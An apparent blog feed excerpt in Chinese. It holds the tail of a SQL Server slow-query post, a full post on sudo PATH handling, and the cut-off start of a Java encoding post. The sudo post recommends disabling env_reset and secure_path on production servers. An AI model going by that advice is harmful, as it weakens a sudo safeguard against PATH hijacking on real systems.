sys.dm_exec_sql_text(er.sql_handle) <span class="keyword">AS</span> qt</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span> = <span class="keyword">CASE</span> <span class="keyword">WHEN</span> er.status <span class="keyword">IN</span> (<span class="string">'RUNNABLE'</span>, <span class="string">'SUSPENDED'</span>, <span class="string">'RUNNING'</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">WHEN</span> er.status = <span class="string">'SLEEPING'</span> <span class="keyword">AND</span> sp.open_tran  &gt; <span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">AND</span> er.command = <span class="string">'SELECT'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> er.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><p>查询的结果如下：</p><img src="/2018/10/09/sqlserver-slow-killer/image-20181009091326051.png"><p>结果中展示了session的<code>pid</code>以及正在执行的命令，消耗的cpu时间以及总的耗费时间，如果需要杀掉这个session，可以用下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kill</span> &lt;pid&gt;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/kill-transact-sql?view=sql-server-2017" rel="external nofollow noopener noreferrer" target="_blank">KILL (Transact-SQL) | Microsoft Docs</a></li><li><a href="https://gist.github.com/alexsorokoletov/a079629f9e1435c7f81f" rel="external nofollow noopener noreferrer" target="_blank">Helpful functions when you need to find out what is going on on SQL Server</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL&quot;&gt;&lt;a href=&quot;#SQL&quot; class=&quot;headerlink&quot; title=&quot;SQL&quot;&gt;&lt;/a&gt;SQL&lt;/h1&gt;&lt;p&gt;查询慢查询的信息：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
      <category term="db" scheme="http://qsli.github.io/categories/db/"/>
    
    
      <category term="sqlserver-killer" scheme="http://qsli.github.io/tags/sqlserver-killer/"/>
    
  </entry>
  
  <entry>
    <title>sudo命令的环境路径</title>
    <link href="http://qsli.github.io/2018/10/07/sudo-path/"/>
    <id>http://qsli.github.io/2018/10/07/sudo-path/</id>
    <published>2018-10-07T13:27:58.000Z</published>
    <updated>2018-10-08T16:46:00.838Z</updated>
    
    <content type="html"><![CDATA[<p>运行sudo命令时，有时会提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -u tomcat jstack 123</span><br><span class="line">sudo: jstack: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><p>但是查看<code>/etc/profile</code>可以看到:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br></pre></td></tr></table></figure><p>确实导出了环境变量，那么为什么运行的时候不成功呢？</p><p>换成如下的命令，可以找到:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i  -u tomcat jstack 123</span><br><span class="line">123: No such process</span><br></pre></td></tr></table></figure><p>这次成功的找到了命令，区别在哪儿？</p><p>可以通过下面的命令查看环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/home/tomcat/.<span class="built_in">local</span>/bin:/home/tomcat/bin</span><br><span class="line">MAIL=/var/spool/mail/tomcat</span><br><span class="line">PWD=/home/tomcat</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">SUDO_COMMAND=/bin/bash -c env</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">SUDO_GID=1024</span><br><span class="line">_=/bin/env</span><br></pre></td></tr></table></figure><p>可以看到<code>PATH</code>中包含了<code>/usr/local/jdk/default/bin</code>，这个是jdk的<code>bin</code>目录，所以<code>jstack</code>命令可以找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo  -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">USER=tomcat</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">SUDO_COMMAND=/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">SUDO_GID=1024</span><br></pre></td></tr></table></figure><p>没有<code>-i</code>的环境变量就没有<code>JDK</code>的路径。</p><p>看下<code>sudo</code>的man：</p><blockquote><p>-i [command]<br>​                The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that<br>​                login-specific resource files such as .profile or .login will be read by the shell.  If a command is specified, it is passed to the shell for execution<br>​                via the shell’s -c option.  If no command is specified, an interactive shell is executed.  sudo attempts to change to that user’s home directory before<br>​                running the shell.  The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in.<br>​                The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers<br>​                policy is in use.</p></blockquote><p><code>/etc/profile</code>的配置确实是全局的配置，但是这个只有在<code>login shell</code>的时候才会去<code>source</code>，才会生效。</p><p>关于集中类型的shell，可以查阅最后的参考链接，这里简单列出下：</p><img src="/2018/10/07/sudo-path/BashStartupFiles1-8918135.png"><ul><li><strong>login</strong> shell: A login shell logs you into the system as a spiecified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login: a login shell (that is interactive). Sourced files:<ul><li><code>/etc/profile</code> and <code>~/.profile</code> for Bourne compatible shells (and <code>/etc/profile.d/*</code>)</li><li><code>~/.bash_profile</code> for bash</li><li><code>/etc/zprofile</code> and <code>~/.zprofile</code> for zsh</li><li><code>/etc/csh.login</code> and <code>~/.login</code> for csh</li></ul></li><li><strong>non-login</strong> shell: A shell that is executed without logging in, necessary for this is a current logged in user. When you open a graphic terminal in gnome it is a non-login (interactive) shell. Sourced files:<ul><li><code>/etc/bashrc</code> and <code>~/.bashrc</code> for bash</li></ul></li><li><strong>interactive</strong> shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal (non-login) or a virtual terminal (login). In an interactive shell the prompt variable must be set (<code>$PS1</code>). Sourced files:<ul><li><code>/etc/profile</code> and <code>~/.profile</code></li><li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash</li></ul></li><li><strong>non-interactive</strong> shell: A (sub)shell that is probably run from an automated process you will see neither input nor outputm when the calling process don’t handle it. That shell is normally a non-login shell, because the calling user has logged in already. A shell running a script is always a non-interactive shell, but the script can emulate an interactive shell by prompting the user to input values. Sourced files:<ul><li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash (but, mostly you see this at the beginning of the script: <code>[ -z &quot;$PS1&quot; ] &amp;&amp; return</code>. That means don’t do anything if it’s a non-interactive shell)</li><li>depending on shell; some of them read the file in the <code>$ENV</code> variable</li></ul></li></ul><h4 id="用sudo-i就好了？"><a href="#用sudo-i就好了？" class="headerlink" title="用sudo -i就好了？"></a>用<code>sudo -i</code>就好了？</h4><p>用<code>sudo -i</code>的问题是当前目录被更改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env | grep PWD --color</span><br><span class="line">PWD=/home/tomcat</span><br></pre></td></tr></table></figure><p>不注意的话就掉坑里了，明明当前目录有脚本却执行不了。</p><h4 id="更好的解决办法"><a href="#更好的解决办法" class="headerlink" title="更好的解决办法"></a>更好的解决办法</h4><p>执行sudo命令时，<code>PATH</code>之所以会改变，起始是一种安全策略，防止用户的路径污染sudo的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secure_path   Path used for every command run from sudo.  If you don&apos;t</span><br><span class="line">               trust the people running sudo to have a sane PATH environ‐</span><br><span class="line">               ment variable you may want to use this.  Another use is if</span><br><span class="line">               you want to have the “root path” be separate from the “user</span><br><span class="line">               path”.  Users in the group specified by the exempt_group</span><br><span class="line">               option are not affected by secure_path.  This option is not</span><br><span class="line">               set by default.</span><br></pre></td></tr></table></figure><p>看下我们线上机器的配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo visudo</span><br><span class="line"></span><br><span class="line">Defaults    env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line">Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></table></figure><p><code>secure_path = /sbin:/bin:/usr/sbin:/usr/bin</code>只设置了这些路径， 和我们在上面看到的输出一致。<code>JDK</code>的bin目录没有加入查找路径，所以找不到命令也就不奇怪了。</p><p>当然<code>env_keep</code>可以保留一些环境变量到sudo命令的环境中，但是无法保留<code>PATH</code>，做如下修改，就可以不重置环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## 第一处修改，这里取反，表示不重置环境变量</span></span><br><span class="line">Defaults    !env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######## 第二处修改</span></span><br><span class="line"><span class="comment">#Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span></span><br></pre></td></tr></table></figure><p>修改之后我们看看对应的环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_01 ~]$ sudo -u tomcat env</span><br><span class="line">XDG_SESSION_ID=111674</span><br><span class="line">HOSTNAME=yd_app_api_01</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_CLIENT=47.97.217.12 35698 22</span><br><span class="line">SSH_TTY=/dev/pts/5</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/usr/<span class="built_in">local</span>/bin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/home/qisheng.li/.<span class="built_in">local</span>/bin:/home/qisheng.li/bin</span><br><span class="line">PWD=/home/qisheng.li</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">SSH_CONNECTION=47.97.217.12 35698 192.168.2.11 22</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1025</span><br><span class="line">_=/usr/bin/sudo</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">SUDO_COMMAND=/usr/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1025</span><br><span class="line">SUDO_GID=1025</span><br></pre></td></tr></table></figure><p>可以看到<code>JAVA_HOME</code>和<code>PATH</code>都有了，这个和<code>qisheng.li</code>的环境变量是一致的，限于篇幅，这里就不贴出来了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="http://feihu.me/blog/2014/env-problem-when-ssh-executing-command-on-remote/" rel="external nofollow noopener noreferrer" target="_blank">ssh连接远程主机执行脚本的环境变量问题</a></li><li><a href="https://unix.stackexchange.com/questions/170493/login-non-login-and-interactive-non-interactive-shells" rel="external nofollow noopener noreferrer" target="_blank">bash - login/non-login and interactive/non-interactive shells - Unix &amp; Linux Stack Exchange</a></li><li><a href="https://unix.stackexchange.com/questions/332948/how-does-lookup-in-path-work-under-the-hood" rel="external nofollow noopener noreferrer" target="_blank">shell - How does lookup in $PATH work under the hood? - Unix &amp; Linux Stack Exchange</a></li><li><a href="https://superuser.com/questions/927512/how-to-set-path-for-sudo-commands" rel="external nofollow noopener noreferrer" target="_blank">linux - How to set path for sudo commands - Super User</a></li><li><a href="http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html" rel="external nofollow noopener noreferrer" target="_blank">http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html</a>)</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;运行sudo命令时，有时会提示：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="sudo" scheme="http://qsli.github.io/tags/sudo/"/>
    
  </entry>
  
  <entry>
    <title>java中encoding总结</title>
    <link href="http://qsli.github.io/2018/08/12/java-encoding/"/>
    <id>http://qsli.github.io/2018/08/12/java-encoding/</id>
    <published>2018-08-12T15:18:44.000Z</published>
    <updated>2018-08-12T15:18:44.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLConnection-乱码"><a href="#URLConnection-乱码" class="headerlink" title="URLConnection 乱码"></a>URLConnection 乱码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL realUrl = <span class="keyword">new</span> URL(<span class="string">""</span>urlNameString<span class="string">""</span>);</span><br><span class="line">URLConnection connection = realUrl.openConnection();</span><br><span class="line">OutputStreamWriter out = <span class="keyword">new</span> OutputStreamWriter(connection  </span><br><span class="line">        .getOutputStream(), <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure><p>在获取<code>OutputStreamWriter</code>需要指定编码格式， 否则使用的是默认的编码， 查看<code>OutputStreamWriter</code>的没有指定编码的构造函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 